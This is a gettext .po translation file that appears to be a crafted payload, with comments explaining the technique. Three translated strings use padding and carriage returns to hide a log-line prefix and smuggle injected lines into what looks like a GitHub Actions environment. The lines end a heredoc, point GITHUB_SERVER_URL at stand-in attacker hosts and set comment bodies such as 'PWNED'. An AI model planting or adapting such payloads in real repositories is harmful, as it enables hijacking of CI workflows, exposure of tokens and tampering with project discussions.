# Key insight: use \r to overwrite prefix on EVERY injected line!
# Prefix is ~45 chars: "WARNING [po/zu.po@XXXXXXX]<TAB>"
# We need padding before each \r to overwrite it

#, c-format
msgid "cannot open '%s'"
msgstr "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rEOF\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rGITHUB_SERVER_URL=https://evil.example\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rCOMMENT_BODY=## SUCCESS Injection worked!"

# Shorter version in case prefix length varies
#, c-format
msgid "pathspec '%s' did not match any files"
msgstr "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rEOF\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rGITHUB_SERVER_URL=https://attacker.example\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rCOMMENT_BODY=PWNED"

# Even more padding to be safe
#, c-format  
msgid "Checking out '%s'"
msgstr "PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_\rEOF\nPADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_\rGITHUB_SERVER_URL=https://phish.example\nPADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_\rCOMMENT_BODY=Phished"
